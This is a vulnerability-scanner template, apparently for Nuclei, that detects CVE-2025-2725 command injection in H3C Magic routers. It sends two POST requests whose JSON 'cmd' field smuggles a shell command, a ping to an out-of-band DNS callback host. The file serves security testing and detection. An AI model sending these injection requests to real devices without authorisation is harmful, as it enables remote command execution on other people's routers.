id: CVE-2025-2725

info:
  name: H3C Magic NX Series Remote Command Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    H3C Magic NX series devices, including Magic NX15, Magic NX30 Pro, Magic NX400, and others (e.g., Magic R3010 and Magic BE18000 up to version V100R014), have a critical vulnerability. The vulnerability involves the `/api/login/auth` component in handling HTTP POST requests, which can be exploited for command injection attacks.
  tags: rce, h3c, routers
  reference:
    - https://yhuanhuan01.github.io/2025/04/19/H3C-Magic-NX15%E2%80%94%E2%80%94cve-2025-2725%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/
  classification:
    cve-id: CVE-2025-2725
    cvss-metrics: CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    cvss-score: 8.6
  metadata:
    manufacturer: H3C
    product: H3C Magic Series Routers
    category: routers
    disclosure-date: 2025-03-25
    add-date: 2025-10-10
    update-date: 2025-10-13

variables:
  dnslog: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /api/wizard/getsyncpppoecfg HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/login
        Origin: {{BaseURL}}
        Content-Type: application/json

        {"cmd":"''; ping {{dnslog}}; ''"}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns

  - raw:
      - |
        POST /api/wizard/getWifiNeighbour HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/login
        Origin: {{BaseURL}}
        Content-Type: application/json

        {"cmd":"''; ping {{dnslog}}; ''"}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns